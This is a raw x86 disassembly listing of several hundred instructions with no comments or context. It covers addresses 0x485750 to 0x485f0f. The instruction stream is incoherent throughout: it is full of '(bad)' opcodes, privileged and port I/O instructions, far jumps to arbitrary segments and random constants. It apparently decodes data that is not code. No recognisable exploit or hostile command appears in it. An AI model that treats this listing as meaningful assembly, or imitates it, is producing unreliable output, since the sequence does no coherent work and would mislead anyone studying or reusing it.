  485750:	pavgb  mm0,QWORD PTR ss:[ebp+0x43]
  485755:	inc    eax
  485756:	call   FWORD PTR [ebx+0x2076244e]
  48575c:	push   edi
  48575d:	dec    eax
  48575e:	jecxz  0x48579c
  485760:	iret   
  485761:	rol    DWORD PTR [esi],cl
  485763:	or     al,0x10
  485765:	adc    al,0x18
  485767:	xor    ch,cl
  485769:	jmp    0xec20:0x645c020
  485770:	add    DWORD PTR [esp+eiz*2-0x1ff4df06],edi
  485777:	mov    DWORD PTR [edi+0x511d48d6],esi
  48577d:	pop    es
  48577e:	mov    al,ds:0xd6fc1258
  485783:	jo     0x485734
  485785:	outs   dx,DWORD PTR ds:[esi]
  485786:	pop    esp
  485787:	pop    ds
  485788:	mov    eax,ds:0x199dcc73
  48578d:	(bad)  
  48578e:	aas    
  48578f:	and    BYTE PTR [esi],al
  485791:	add    BYTE PTR [edi],0x66
  485794:	dec    edi
  485795:	js     0x48574e
  485797:	sbb    eax,0x49512d85
  48579c:	cmc    
  48579d:	jae    0x485766
  48579f:	mov    dh,0xef
  4857a1:	cmp    eax,0x885f6d82
  4857a6:	inc    edx
  4857a7:	xchg   ebx,eax
  4857a8:	cli    
  4857a9:	sbb    DWORD PTR [eax-0x6d],esp
  4857ac:	clc    
  4857ad:	xchg   esi,eax
  4857ae:	xor    al,0xfe
  4857b0:	or     eax,0xaa4884dc
  4857b5:	in     eax,dx
  4857b6:	mov    WORD PTR gs:[ebx],?
  4857b9:	or     bl,ah
  4857bb:	aam    0x7a
  4857bd:	push   0xffffffb5
  4857bf:	popa   
  4857c0:	mov    bh,dh
  4857c2:	not    BYTE PTR [edi]
  4857c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4857c5:	or     DWORD PTR [eax],0x4b
  4857c8:	pop    eax
  4857c9:	lock sti 
  4857cb:	mov    al,ds:0x8de88df7
  4857d0:	stos   DWORD PTR es:[edi],eax
  4857d1:	iret   
  4857d2:	add    eax,0xe22bd815
  4857d7:	adc    DWORD PTR [edx-0x71d54fca],0x0
  4857de:	das    
  4857df:	test   eax,0xd750570a
  4857e4:	pop    esi
  4857e5:	aaa    
  4857e6:	ins    DWORD PTR es:[edi],dx
  4857e7:	mov    DWORD PTR [edi+0x2cd7f238],ecx
  4857ed:	jo     0x48582a
  4857ef:	out    dx,eax
  4857f0:	(bad)  
  4857f1:	pop    ss
  4857f2:	push   0x7f80f86b
  4857f7:	adc    cl,BYTE PTR [edx]
  4857f9:	mov    al,ds:0x46b0479c
  4857fe:	mov    esp,0x6147fe1a
  485803:	jne    0x485854
  485805:	lock xlat BYTE PTR ds:[ebx]
  485807:	lea    ebx,[ecx+eiz*1+0x7]
  48580b:	leave  
  48580c:	pushf  
  48580d:	pushf  
  48580e:	or     ah,al
  485810:	sbb    dl,BYTE PTR [ecx]
  485812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  485813:	jecxz  0x4857c9
  485815:	imul   ebx,DWORD PTR ds:0x8f8f37c4,0xffffffd9
  48581c:	cmp    DWORD PTR [eax+0x42],0xffffffe1
  485820:	add    edx,DWORD PTR [ecx]
  485822:	push   esp
  485823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  485824:	sub    BYTE PTR [esi+0x21],al
  485827:	stc    
  485828:	mov    esp,0x3646601c
  48582d:	(bad)  
  48582e:	lock inc edi
  485830:	mov    ds:0xf7026210,al
  485835:	mov    eax,ds:0x1470263
  48583a:	addr16 loope 0x4858b5
  48583d:	xor    cl,0xc3
  485840:	xlat   BYTE PTR ds:[ebx]
  485841:	call   DWORD PTR ss:[ebx]
  485844:	popa   
  485845:	jg     0x485857
  485847:	jge    0x485858
  485849:	mov    eax,0x75764850
  48584e:	inc    ebx
  48584f:	fs jmp 0x485871
  485852:	lea    eax,[esi+0x4]
  485855:	cmp    al,0x90
  485857:	mov    DWORD PTR [ecx],eax
  485859:	mov    eax,ds:0x826ecdf8
  48585e:	icebp  
  48585f:	loopne 0x485828
  485861:	in     eax,dx
  485862:	xlat   BYTE PTR ds:[ebx]
  485863:	imul   esp,esp,0xf6003622
  485869:	or     dh,ah
  48586b:	mov    BYTE PTR [esi],dl
  48586d:	test   DWORD PTR [ebx+0x3b],ecx
  485870:	pusha  
  485871:	ins    BYTE PTR es:[edi],dx
  485872:	xchg   edi,eax
  485873:	push   edi
  485874:	dec    eax
  485875:	repnz sbb DWORD PTR [ebx+0x19],edx
  485879:	add    dl,BYTE PTR [eax-0x5f]
  48587c:	dec    eax
  48587d:	xor    al,0xa6
  48587f:	ret    
  485880:	adc    BYTE PTR fs:[ecx],ah
  485883:	pop    eax
  485884:	lock rcl DWORD PTR [ebx+0x7bb30e43],0xa8
  48588c:	dec    eax
  48588d:	std    
  48588e:	mov    eax,ds:0xf14b32e5
  485893:	outs   dx,DWORD PTR ds:[esi]
  485894:	push   edi
  485895:	push   0x67c42621
  48589a:	xchg   DWORD PTR [ebp+0x435b0f80],edi
  4858a0:	add    eax,0x2bf21f46
  4858a5:	(bad)  
  4858a7:	(bad)  [eax-0x1ce25bf7]
  4858ad:	jmp    0x48588d
  4858af:	push   es
  4858b0:	add    al,0x76
  4858b2:	rcr    BYTE PTR [esi],0xd2
  4858b5:	in     eax,0xdc
  4858b7:	test   DWORD PTR [edx+0x12f571d3],0x9f80208b
  4858c1:	ret    
  4858c2:	rol    BYTE PTR [esi+0x46],0x8f
  4858c6:	repz push esi
  4858c8:	dec    ecx
  4858c9:	ja     0x4858d3
  4858cb:	xchg   bh,bh
  4858cd:	and    DWORD PTR [ebx+0x5c],0x78
  4858d1:	sub    DWORD PTR [eax+0x850fc40],esi
  4858d7:	xchg   ebx,eax
  4858d8:	and    BYTE PTR [edx+0x13],ch
  4858db:	sbb    DWORD PTR [ebp+0x559f0b0b],0x244db438
  4858e5:	sbb    DWORD PTR ds:0xb9b8b8b2,0xe96f81bc
  4858ef:	pop    edx
  4858f0:	adc    eax,0x62655025
  4858f5:	stos   BYTE PTR es:[edi],al
  4858f6:	pop    eax
  4858f7:	add    al,0x44
  4858f9:	out    dx,al
  4858fa:	dec    edi
  4858fb:	pop    esi
  4858fc:	sbb    edi,DWORD PTR [ecx]
  4858fe:	xor    al,0x87
  485900:	(bad)
  485903:	push   cs
  485904:	xor    dh,BYTE PTR [edx]
  485906:	jg     0x4858b8
  485908:	fadd   DWORD PTR [ecx+0x6f67c3c0]
  48590e:	je     0x485945
  485910:	les    ebp,FWORD PTR [ebx*4+0x21ef7719]
  485917:	or     al,0xb5
  485919:	sbb    ecx,esi
  48591b:	or     al,0x91
  48591d:	cs mov ecx,0xdeabcaf
  485923:	gs lahf 
  485925:	dec    esp
  485926:	pop    ebp
  485927:	mov    al,0x90
  485929:	cmp    DWORD PTR [eax+0x40c7085],0x79
  485930:	push   ecx
  485931:	xor    edx,DWORD PTR [edi+0x2549b3c4]
  485937:	or     dh,BYTE PTR [ebp-0x133c78e8]
  48593d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  48593f:	and    eax,0xbf831518
  485944:	ja     0x485952
  485946:	int3   
  485947:	inc    edx
  485948:	ret    
  485949:	cmp    BYTE PTR [edx],al
  48594b:	ret    
  48594c:	push   eax
  48594d:	das    
  48594e:	adc    bl,BYTE PTR [edx+0x8]
  485951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  485952:	jae    0x485986
  485954:	dec    BYTE PTR [esi-0x7a]
  485957:	pop    ebx
  485958:	adc    cl,BYTE PTR [ecx]
  48595a:	adc    DWORD PTR [eax+ecx*1+0x74],edx
  48595e:	inc    edx
  48595f:	pop    es
  485960:	mul    eax
  485962:	inc    ebp
  485963:	je     0x4859ad
  485965:	cs xor edi,edx
  485968:	aam    0x5c
  48596a:	shl    BYTE PTR [edx],1
  48596c:	xor    eax,0xe0223794
  485971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  485972:	arpl   bp,ax
  485974:	and    al,0xbf
  485976:	sbb    al,0xe1
  485978:	ficomp DWORD PTR [ecx+0x4]
  48597b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48597c:	jo     0x4859b8
  48597e:	push   esp
  48597f:	(bad)  
  485980:	mov    bh,0x3d
  485982:	mov    esi,DWORD PTR [esp+esi*2+0x60]
  485986:	pop    eax
  485987:	mov    al,BYTE PTR [eax+0x5274ca3a]
  48598d:	sbb    ch,BYTE PTR [ebp+0x653b704]
  485993:	mov    BYTE PTR [eax-0x6db496df],dl
  485999:	hlt    
  48599a:	add    BYTE PTR [esi],ah
  48599c:	fstp   QWORD PTR [ecx]
  48599e:	xchg   esi,eax
  48599f:	xor    dl,BYTE PTR [eax+eax*1-0x8f3e257]
  4859a6:	push   eax
  4859a7:	push   0xffffffb6
  4859a9:	xor    al,0x6
  4859ab:	mov    BYTE PTR [edx-0x17bf8d89],al
  4859b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4859b2:	rcl    DWORD PTR [edi-0x61],cl
  4859b5:	hlt    
  4859b6:	adc    al,0x2e
  4859b8:	push   ss
  4859b9:	fsubp  st(3),st
  4859bb:	or     ecx,DWORD PTR [ecx+edi*1+0x18525a28]
  4859c2:	dec    eax
  4859c3:	pop    ss
  4859c4:	mov    dh,0x17
  4859c6:	sub    al,BYTE PTR [ecx+ecx*4]
  4859c9:	pop    ds
  4859ca:	inc    BYTE PTR [edx+0xd23f90]
  4859d0:	rol    edi,0x59
  4859d3:	data16 xlat BYTE PTR ds:[ebx]
  4859d5:	sub    BYTE PTR [esi-0x9],dh
  4859d8:	xchg   BYTE PTR [ecx],cl
  4859da:	js     0x485a17
  4859dc:	mov    bl,0x41
  4859de:	je     0x485a50
  4859e0:	aad    0xe3
  4859e2:	sti    
  4859e3:	xor    DWORD PTR [ebx+edx*2+0x63],ebp
  4859e7:	dec    edx
  4859e8:	fadd   QWORD PTR [esi-0x77]
  4859eb:	cmp    edx,DWORD PTR [esi-0x8]
  4859ee:	add    esi,eax
  4859f0:	scas   eax,DWORD PTR es:[edi]
  4859f1:	ret    
  4859f2:	jo     0x485995
  4859f4:	fdiv   DWORD PTR [eax-0x14]
  4859f7:	add    eax,0xc176367c
  4859fc:	push   eax
  4859fd:	rol    BYTE PTR [ecx],0x2c
  485a00:	mov    ds:0x603ba66,al
  485a05:	(bad)  
  485a06:	scas   eax,DWORD PTR es:[edi]
  485a07:	or     ebx,DWORD PTR [eax+0x44d0acb8]
  485a0d:	daa    
  485a0e:	add    DWORD PTR [ebp+0x14],ebx
  485a11:	or     esp,DWORD PTR [ecx-0x39]
  485a14:	pop    eax
  485a15:	ret    
  485a16:	mov    bl,0x38
  485a18:	add    al,0x16
  485a1a:	out    dx,eax
  485a1b:	cdq    
  485a1c:	sub    edi,DWORD PTR [esi+0x75f22e47]
  485a22:	adc    dh,BYTE PTR [edi+0x74]
  485a25:	dec    esp
  485a26:	inc    ebx
  485a27:	sbb    esi,DWORD PTR [eax]
  485a29:	pushf  
  485a2a:	rcl    BYTE PTR [eax-0x7228e39d],1
  485a30:	mov    dl,bh
  485a32:	pop    ss
  485a33:	std    
  485a34:	ss xor eax,0xd48bc065
  485a3a:	fwait
  485a3b:	jmp    0x4fd3:0x1308b024
  485a42:	push   0x35
  485a44:	adc    al,0xcf
  485a46:	loopne 0x485a62
  485a48:	clc    
  485a49:	mov    ecx,0x52c7f8a1
  485a4e:	add    al,0x2b
  485a50:	push   ebx
  485a51:	inc    esp
  485a52:	adc    eax,0x1d6ae362
  485a57:	sub    ecx,ebx
  485a59:	ja     0x485ac4
  485a5b:	mov    ah,0x92
  485a5d:	xchg   edi,eax
  485a5e:	push   eax
  485a5f:	aad    0x55
  485a61:	push   cs
  485a62:	cmp    BYTE PTR [ebp-0x78f008a],ch
  485a68:	add    al,0xf4
  485a6a:	clc    
  485a6b:	xlat   BYTE PTR ds:[ebx]
  485a6c:	arpl   WORD PTR [ecx],dx
  485a6e:	icebp  
  485a6f:	push   esi
  485a70:	fcomp  QWORD PTR ds:0x1644903
  485a76:	fst    DWORD PTR [esi+0x2a]
  485a79:	adc    DWORD PTR [eax+eax*2-0x28],0xd8164275
  485a81:	cmp    al,0x43
  485a83:	add    BYTE PTR [ebp+0x26],0xa1
  485a87:	xor    ch,bh
  485a89:	sbb    eax,0x1ad11324
  485a8e:	or     ebx,esi
  485a90:	loopne 0x485a62
  485a92:	push   eax
  485a93:	inc    edx
  485a94:	or     eax,0xa2bf423
  485a99:	xor    DWORD PTR [edx+0x4a],esp
  485a9c:	and    esp,DWORD PTR ds:0x64f85bd5
  485aa2:	mov    WORD PTR [esi],gs
  485aa4:	xor    bl,BYTE PTR [edx-0x14]
  485aa7:	xchg   ebx,eax
  485aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  485aa9:	daa    
  485aaa:	inc    edx
  485aab:	mov    edi,0xdf34d88
  485ab0:	and    edx,DWORD PTR [eax+0x10]
  485ab3:	sub    esp,DWORD PTR [edx]
  485ab5:	sbb    eax,0x789a942e
  485aba:	cmp    DWORD PTR ss:[esi-0x15e08a64],0xffffffda
  485ac2:	add    al,0x96
  485ac4:	jnp    0x485ae4
  485ac6:	shl    DWORD PTR fs:[edx],cl
  485ac9:	pop    edx
  485aca:	adc    BYTE PTR [edx-0x51],0x49
  485ace:	cmp    al,0x90
  485ad0:	fisubr WORD PTR [ecx+ecx*4-0x1dcceca0]
  485ad7:	xor    al,0x2b
  485ad9:	sub    eax,0x35ac4c84
  485ade:	jmp    0x3e0c80a
  485ae3:	sub    al,0x36
  485ae5:	ins    BYTE PTR es:[edi],dx
  485ae6:	jmp    0x558:0x5891bf39
  485aed:	add    DWORD PTR [ebp+0x50],edi
  485af0:	pusha  
  485af1:	mov    ch,0x22
  485af3:	inc    edi
  485af4:	nop
  485af5:	es pop ds
  485af7:	or     DWORD PTR [edi-0x51],esi
  485afa:	xor    bh,bl
  485afc:	adc    ah,BYTE PTR [ecx+0x30583b0f]
  485b02:	adc    DWORD PTR [ebp+0x1da8aec4],edx
  485b08:	adc    eax,0x1dd821eb
  485b0d:	out    dx,al
  485b0e:	inc    ebx
  485b0f:	clc    
  485b10:	xchg   dh,bh
  485b12:	sub    al,BYTE PTR [esi+0x23]
  485b15:	pop    ss
  485b16:	inc    eax
  485b17:	adc    DWORD PTR [ebx+0x11],edx
  485b1a:	xchg   DWORD PTR ds:0x609a22f1,edi
  485b20:	and    edi,DWORD PTR [edx-0x32bc3bd2]
  485b26:	adc    ebp,DWORD PTR [eax+0x1a]
  485b29:	sbb    dl,BYTE PTR [edx]
  485b2b:	or     al,BYTE PTR [edx+edi*8-0x6c]
  485b2f:	mov    WORD PTR ds:0x8116549b,ss
  485b35:	imul   edi,DWORD PTR [eax+eax*2+0x30c46c9],0x8207005
  485b40:	daa    
  485b41:	push   es
  485b42:	cmp    eax,0xf15da388
  485b47:	call   0xe90873cb
  485b4c:	pop    es
  485b4d:	adc    al,0x48
  485b4f:	je     0x485baa
  485b51:	push   cs
  485b52:	pop    ss
  485b53:	out    dx,al
  485b54:	adc    BYTE PTR [esi],bl
  485b56:	and    DWORD PTR [ebp+0x5e],esi
  485b59:	aas    
  485b5a:	ret    
  485b5b:	add    eax,0x11b7a80e
  485b60:	jo     0x485b86
  485b62:	or     DWORD PTR [edi],ecx
  485b64:	adc    ch,0x8
  485b67:	or     DWORD PTR [esi],eax
  485b69:	sub    DWORD PTR [ecx+edi*8+0x418f0b1b],ebp
  485b70:	loope  0x485b13
  485b72:	ror    DWORD PTR [esi+edx*8-0x12],cl
  485b76:	ins    BYTE PTR es:[edi],dx
  485b77:	idiv   BYTE PTR ds:0x2ee25ccb
  485b7d:	cmp    ch,al
  485b7f:	jb     0x485b6c
  485b81:	(bad)  
  485b82:	pop    esi
  485b83:	dec    eax
  485b84:	test   BYTE PTR [ebx-0x7a],dl
  485b87:	and    BYTE PTR [edi],cl
  485b89:	test   esp,ebx
  485b8b:	jno    0x485b63
  485b8d:	add    eax,0x3504d064
  485b92:	loopne 0x485bd6
  485b94:	adc    al,0x85
  485b96:	nop
  485b97:	or     cl,BYTE PTR [esp+eax*8-0x1f]
  485b9b:	jmp    0x4a5:0x80a31c11
  485ba2:	(bad)  
  485ba3:	sti    
  485ba4:	ss jno 0x485b85
  485ba7:	test   DWORD PTR [eax+0x1da1bb92],esi
  485bad:	hlt    
  485bae:	icebp  
  485baf:	in     al,0xcc
  485bb1:	cmp    eax,0xed702edc
  485bb6:	jae    0x485b4a
  485bb8:	les    edx,FWORD PTR [ecx+0x53]
  485bbb:	stos   DWORD PTR es:[edi],eax
  485bbc:	push   0xa4562687
  485bc1:	rcl    DWORD PTR [ecx],cl
  485bc3:	dec    ebx
  485bc4:	mov    ds:0xebdf8be2,eax
  485bc9:	dec    esi
  485bca:	sbb    eax,0x437cc403
  485bcf:	jmp    0x485c09
  485bd1:	dec    ecx
  485bd2:	pop    es
  485bd3:	cmp    BYTE PTR [eax+edx*4+0x26],ah
  485bd7:	sbb    eax,0xc3c14113
  485bdc:	pop    ebx
  485bdd:	push   eax
  485bde:	sub    BYTE PTR ds:0x22c69bbf,ah
  485be4:	ins    DWORD PTR es:[edi],dx
  485be5:	dec    eax
  485be6:	(bad)  
  485be7:	call   DWORD PTR [ecx-0x51]
  485bea:	xor    al,0x24
  485bec:	inc    ecx
  485bed:	ss jecxz 0x485c2b
  485bf0:	cmp    edi,0x7b
  485bf3:	fwait
  485bf4:	mov    ecx,ss
  485bf6:	sub    bl,BYTE PTR [esi+edi*2+0x30]
  485bfa:	les    edx,FWORD PTR ds:0xa9b99fc3
  485c00:	xlat   BYTE PTR ds:[ebx]
  485c01:	mov    BYTE PTR [edi+0xc6b89e8],al
  485c07:	test   ebp,ebp
  485c09:	push   ss
  485c0a:	test   DWORD PTR [ebx],ebx
  485c0c:	sbb    ebx,DWORD PTR [esi-0x3f]
  485c0f:	push   ebp
  485c10:	mov    WORD PTR ds:0x7e2e7ece,es
  485c16:	loop   0x485bb7
  485c18:	std    
  485c19:	jb     0x485c27
  485c1b:	add    eax,0x1c134407
  485c20:	jmp    0x485c7b
  485c22:	mov    ebp,DWORD PTR [ebx+0x8]
  485c25:	push   ebp
  485c26:	mov    es,WORD PTR [ecx+0x5ec326c7]
  485c2c:	xchg   BYTE PTR [eax],bh
  485c2e:	retf   0x41ea
  485c31:	sbb    BYTE PTR [eax],0xcf
  485c34:	pop    esp
  485c35:	sub    BYTE PTR [ebx+0x64],ch
  485c38:	loopne 0x485c83
  485c3a:	and    esi,DWORD PTR [ebp-0x7b]
  485c3d:	popf   
  485c3e:	dec    ebp
  485c3f:	pop    ebx
  485c40:	lds    eax,FWORD PTR [esi]
  485c42:	shl    DWORD PTR [ebx],0xf0
  485c45:	pop    edx
  485c46:	outs   dx,DWORD PTR ds:[esi]
  485c47:	pop    edx
  485c48:	fistp  QWORD PTR [ebp+0x2c]
  485c4b:	cmp    edi,DWORD PTR ds:0x73238abc
  485c51:	sbb    BYTE PTR [edi],bl
  485c53:	gs (bad) 
  485c55:	xchg   ebp,eax
  485c56:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  485c58:	push   edi
  485c59:	pop    ecx
  485c5a:	xchg   edi,eax
  485c5b:	jno    0x485cd4
  485c5d:	mov    eax,ds:0x7865740c
  485c62:	pop    edx
  485c63:	ins    BYTE PTR es:[edi],dx
  485c64:	add    ecx,DWORD PTR [ebx+0xcf878cb]
  485c6a:	jne    0x485c87
  485c6c:	iret   
  485c6d:	xor    al,0x92
  485c6f:	jmp    0x1ada:0xd003bd46
  485c76:	sub    BYTE PTR [eax-0x59],0x17
  485c7a:	call   0x38e9:0xeb4b8ba3
  485c81:	sbb    edx,DWORD PTR [ebx]
  485c83:	xor    eax,0x60c0910a
  485c88:	add    edx,0xb841cc81
  485c8e:	mov    ebx,0xff878a52
  485c93:	mov    al,0x72
  485c95:	add    al,0x3a
  485c97:	outs   dx,BYTE PTR ds:[esi]
  485c98:	inc    ebx
  485c99:	pop    ebx
  485c9a:	pop    ebx
  485c9b:	xchg   esi,eax
  485c9c:	push   cs
  485c9d:	dec    eax
  485c9e:	xlat   BYTE PTR ds:[ebx]
  485c9f:	nop
  485ca0:	in     al,dx
  485ca1:	mov    al,0x41
  485ca3:	in     al,0xb3
  485ca5:	or     al,BYTE PTR [esi]
  485ca7:	pop    eax
  485ca8:	(bad)  
  485caa:	sub    al,0x34
  485cac:	push   edx
  485cad:	sbb    al,0xc1
  485caf:	push   ecx
  485cb0:	call   0x7380:0xd3da3783
  485cb7:	dec    esp
  485cb8:	add    DWORD PTR [ebp-0x48],ebx
  485cbb:	inc    ebp
  485cbc:	inc    ecx
  485cbd:	sti    
  485cbe:	mov    ebp,0x7f35a124
  485cc3:	rcr    BYTE PTR [edi-0xc],1
  485cc6:	or     DWORD PTR [edx-0x62fd7ba5],eax
  485ccc:	pop    ebx
  485ccd:	xchg   BYTE PTR [esp+eax*4+0x3f],cl
  485cd1:	cmp    eax,0x9547547c
  485cd6:	cwde   
  485cd7:	adc    edi,DWORD PTR [edx]
  485cd9:	mov    eax,ds:0x6d0c7313
  485cde:	xor    DWORD PTR [edi+0x4d],esp
  485ce1:	les    ecx,FWORD PTR [ebx-0x5e]
  485ce4:	sub    edi,DWORD PTR [eax]
  485ce6:	je     0x485d0d
  485ce8:	mov    al,ds:0x1b34e903
  485ced:	or     ecx,DWORD PTR [eax]
  485cef:	push   ss
  485cf0:	or     al,0x48
  485cf2:	or     cl,ah
  485cf4:	mov    bl,0x2
  485cf6:	push   ss
  485cf7:	inc    eax
  485cf8:	xor    bl,al
  485cfa:	or     BYTE PTR [eax+eiz*2],al
  485cfd:	mov    ds:0x685ebd0e,al
  485d02:	adc    BYTE PTR [ebp+eax*2-0x7e],bh
  485d06:	scas   eax,DWORD PTR es:[edi]
  485d07:	adc    ecx,DWORD PTR ds:0x7d1b9219
  485d0d:	dec    ebx
  485d0e:	ret    0xc853
  485d11:	mov    ds:0x1e504b31,al
  485d16:	push   esp
  485d17:	imul   edi,DWORD PTR [ebx],0x82874b52
  485d1d:	xor    DWORD PTR [edx],0x4859e78a
  485d23:	mov    edx,0x31662432
  485d28:	(bad)  
  485d29:	cwde   
  485d2a:	(bad)  
  485d2b:	or     ah,BYTE PTR [ebx-0x4ffd08b5]
  485d31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  485d32:	test   al,0x71
  485d34:	or     esi,DWORD PTR [ebx]
  485d36:	ret    
  485d37:	adc    BYTE PTR [edi-0x20],al
  485d3a:	mov    ch,0x1
  485d3c:	adc    esp,DWORD PTR [edx-0x40417fac]
  485d42:	mov    al,al
  485d44:	daa    
  485d45:	sbb    ebx,DWORD PTR [edi]
  485d47:	sub    edx,DWORD PTR [esi]
  485d49:	cmp    DWORD PTR [esi+0x15086b7c],0x28
  485d50:	push   esi
  485d51:	xchg   bh,ah
  485d53:	aad    0x77
  485d55:	jne    0x485ce1
  485d57:	mov    al,ss:0xdf820720
  485d5d:	lds    ecx,FWORD PTR [edx+0x74]
  485d60:	add    ah,ch
  485d62:	pandn  mm3,QWORD PTR [esi-0x5a55372e]
  485d69:	jl     0x485d6a
  485d6b:	inc    ebp
  485d6c:	jbe    0x485dad
  485d6e:	test   eax,0x8d82372b
  485d73:	mov    ch,0x52
  485d75:	sub    DWORD PTR [eax-0x6f],eax
  485d78:	(bad)  
  485d79:	jmp    0xfc87755
  485d7e:	jl     0x485d8b
  485d80:	js     0x485d86
  485d82:	test   DWORD PTR [eax],eax
  485d84:	sbb    BYTE PTR ss:[eax+0x45],al
  485d88:	rol    BYTE PTR [edx+0x4c43903d],cl
  485d8e:	adc    cl,BYTE PTR [edx+0x67]
  485d91:	and    bh,0x4b
  485d94:	inc    eax
  485d95:	mov    ah,0x74
  485d97:	pusha  
  485d98:	mov    WORD PTR [ecx],ss
  485d9a:	xchg   ecx,eax
  485d9b:	mov    eax,ds:0x68ca2789
  485da0:	lds    edx,FWORD PTR [edi+0x6a]
  485da3:	push   esi
  485da4:	add    BYTE PTR [esi+eax*1-0x177f0956],cl
  485dab:	test   al,0x3
  485dad:	jl     0x485d75
  485daf:	lea    ebp,[ebx]
  485db1:	shl    cl,1
  485db3:	jmpw   0x1d10
  485db7:	inc    ebp
  485db8:	lds    ebp,FWORD PTR [eax+0x217ad59c]
  485dbe:	dec    ebx
  485dbf:	mov    ecx,0xfbae855
  485dc4:	rcr    cl,0xa5
  485dc7:	sar    BYTE PTR [edi+0x66c8a764],1
  485dcd:	add    ebp,DWORD PTR [eax+edx*8+0x19]
  485dd1:	cmova  ebp,DWORD PTR [ecx-0x74]
  485dd5:	dec    ebx
  485dd6:	mov    dh,0x1c
  485dd8:	mov    BYTE PTR [esi],ah
  485dda:	add    eax,0xa3969cd8
  485ddf:	iret   
  485de0:	ret    0x969
  485de3:	cmp    esp,ebp
  485de5:	div    BYTE PTR [ebx]
  485de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485de8:	mov    WORD PTR [esp+ebp*2],ss
  485deb:	inc    ecx
  485dec:	stos   DWORD PTR es:[edi],eax
  485ded:	popa   
  485dee:	cmp    al,0x5
  485df0:	(bad)  
  485df1:	shl    BYTE PTR [ebp-0x164baf48],1
  485df7:	nop
  485df8:	and    eax,0x5a9aa4d9
  485dfe:	sbb    eax,0x198878d8
  485e03:	push   cs
  485e04:	mov    gs,WORD PTR [ecx]
  485e06:	in     eax,0x98
  485e08:	les    edx,FWORD PTR [esi+0x13]
  485e0b:	js     0x485da5
  485e0d:	in     al,0x18
  485e0f:	or     ebx,DWORD PTR [eax]
  485e11:	dec    edx
  485e12:	or     al,0x48
  485e14:	sbb    DWORD PTR [edi+edx*4+0x59140f61],edi
  485e1b:	sbb    BYTE PTR [ebp+0x7b],0x30
  485e1f:	mov    al,0x83
  485e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  485e22:	cwde   
  485e23:	adc    al,0x40
  485e25:	fwait
  485e26:	inc    ecx
  485e27:	cs jecxz 0x485e3b
  485e2a:	fld    TBYTE PTR [ecx-0x1b00b867]
  485e30:	adc    al,bh
  485e32:	add    al,BYTE PTR ds:0xc4c21b48
  485e38:	and    BYTE PTR [ebp+0xc],bl
  485e3b:	cdq    
  485e3c:	lods   al,BYTE PTR ds:[esi]
  485e3d:	adc    eax,0xc4ed5bcf
  485e42:	xchg   edx,eax
  485e43:	jo     0x485e18
  485e45:	push   esi
  485e46:	xchg   esp,esi
  485e48:	sets   BYTE PTR [edx]
  485e4b:	test   al,0x87
  485e4d:	jmp    0xc0bd5e11
  485e52:	and    eax,DWORD PTR [edx]
  485e54:	and    eax,0x1909a2ec
  485e59:	imul   eax,DWORD PTR [esi-0x7c1589ed],0xffffffcc
  485e60:	js     0x485e8e
  485e62:	adc    bh,BYTE PTR [edi+0x22ebc40f]
  485e68:	cmp    BYTE PTR [esp+ebx*2+0x32],cl
  485e6c:	pop    gs
  485e6e:	jp     0x485e9b
  485e70:	jmp    0x485e64
  485e72:	les    esp,FWORD PTR [edx-0x2e5ffcba]
  485e78:	xor    BYTE PTR [ecx],0x11
  485e7b:	pop    eax
  485e7c:	dec    ecx
  485e7d:	rcr    DWORD PTR [edx],0xb4
  485e80:	jae    0x485e89
  485e82:	ins    DWORD PTR es:[edi],dx
  485e83:	jmp    0x1c3eb608
  485e88:	in     eax,0x59
  485e8a:	add    BYTE PTR [ebx-0x7ad85f4c],al
  485e90:	loopne 0x485eb5
  485e92:	mov    bl,0xb1
  485e94:	add    BYTE PTR [edi],0xe9
  485e97:	push   eax
  485e98:	std    
  485e99:	das    
  485e9a:	and    al,0xf9
  485e9c:	xchg   edx,eax
  485e9d:	cld    
  485e9e:	sbb    dh,cl
  485ea0:	mov    edx,0x530f1f14
  485ea5:	or     DWORD PTR [eax],ebx
  485ea7:	push   0xffffff93
  485ea9:	cmp    eax,0xf5c6354b
  485eae:	xchg   edx,eax
  485eaf:	xor    al,0xf0
  485eb1:	aas    
  485eb2:	xor    ebx,DWORD PTR [ebx]
  485eb4:	add    ebx,DWORD PTR [edi+0x9]
  485eb7:	call   0x9844:0x2b4048f3
  485ebe:	js     0x485ec1
  485ec0:	sbb    eax,DWORD PTR [ebx]
  485ec2:	mov    edi,0x213e75f0
  485ec7:	xchg   dl,dl
  485ec9:	xor    DWORD PTR [edx],ebp
  485ecb:	lds    ebx,FWORD PTR [ebx-0x16]
  485ece:	loope  0x485e50
  485ed0:	xcrypt-cbc (bad)
  485ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485ed2:	xchg   esp,eax
  485ed3:	sub    edi,DWORD PTR [ebp-0x8]
  485ed6:	inc    edx
  485ed7:	test   al,0x64
  485ed9:	jge    0x485ebe
  485edb:	push   es
  485edc:	or     al,0x36
  485ede:	jp     0x485e62
  485ee0:	jb     0x485efa
  485ee2:	data16 sahf 
  485ee4:	xchg   ebx,eax
  485ee5:	pop    ebx
  485ee6:	adc    BYTE PTR [edi],al
  485ee8:	inc    ebp
  485ee9:	ja     0x485ec1
  485eeb:	mov    eax,ebx
  485eed:	retf   
  485eee:	js     0x485ed7
  485ef0:	rol    BYTE PTR [edi+0x45],0xc7
  485ef4:	inc    ecx
  485ef5:	adc    BYTE PTR [ebx],bl
  485ef7:	push   ebp
  485ef8:	jmp    0xb3a4:0x4193680
  485eff:	or     BYTE PTR [edi],0x69
  485f02:	scas   eax,DWORD PTR es:[edi]
  485f03:	push   esp
  485f04:	sbb    dl,BYTE PTR [esp+ebx*4+0x19665750]
  485f0b:	out    0x80,eax
  485f0d:	xchg   ebx,eax
  485f0e:	clc    
  485f0f:	push   edi
